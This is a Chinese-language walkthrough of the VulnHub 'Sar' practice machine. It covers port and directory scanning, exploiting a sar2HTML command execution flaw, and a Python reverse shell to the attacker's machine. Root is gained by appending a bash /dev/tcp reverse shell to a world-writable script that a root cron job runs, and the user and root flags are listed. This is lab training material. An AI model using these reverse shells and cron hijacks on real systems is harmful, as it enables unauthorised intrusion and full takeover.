## 靶机信息
级别:容易
下载地址:[https://download.vulnhub.com/sar/sar.zip](https://download.vulnhub.com/sar/sar.zip)

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.145

sudo nmap --min-rate 10000 -sT -p- 192.168.1.145 -oA tcp_scan/ports 
//Ports:
PORT   STATE SERVICE                                                          │
80/tcp open  http   

sudo nmap -sT -p 80 -sV -sC -O 192.168.1.145
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:86:0D:48 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
```
## Web
![[Pasted image 20231009101139.png]]
### 目录爆破
```shell
gobuster dir -u http://192.168.1.145/ -w /usr/share/wordlists/dirb/common.txt

/phpinfo.php          (Status: 200) [Size: 95401]
/robots.txt           (Status: 200) [Size: 9]
```
robots.txt ：
![[Pasted image 20231009101345.png]]
访问sar2HTML
![[Pasted image 20231009101538.png]]

```shell
searchsploit sar2HTML //发现远程命令执行漏洞
```
![[Pasted image 20231009102720.png]]

![[Pasted image 20231009102739.png]]

## 反弹shell
```shell
dpkg -l | grep python
//看到靶机有安装python
export RHOST="192.168.1.136";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
//执行python3连接到kali
```
## 提权

```shell
find / -name "user.txt" 2>/dev/null
//得到user flag:427a7e47deb4a8649c7cab38df232b52

cat /etc/crontab
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
ls -al finally.sh
// -rwxr-xr-x 1 root root 22 Oct 20  2019 finally.sh

cat finally.sh
//
#!/bin/sh

./write.sh

cat write.sh
//
#!/bin/sh

touch /tmp/gateway

ls -al write.sh
-rwxrwxrwx 1 www-data www-data 30 Oct 21  2019 write.sh //www-data 用户对write.sh有rwx权限

echo " /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.136/4444 0>&1' " >> write.sh

成功提权
root flag:66f93d6b2ca96c9ad78a8a9ba0008e99
```

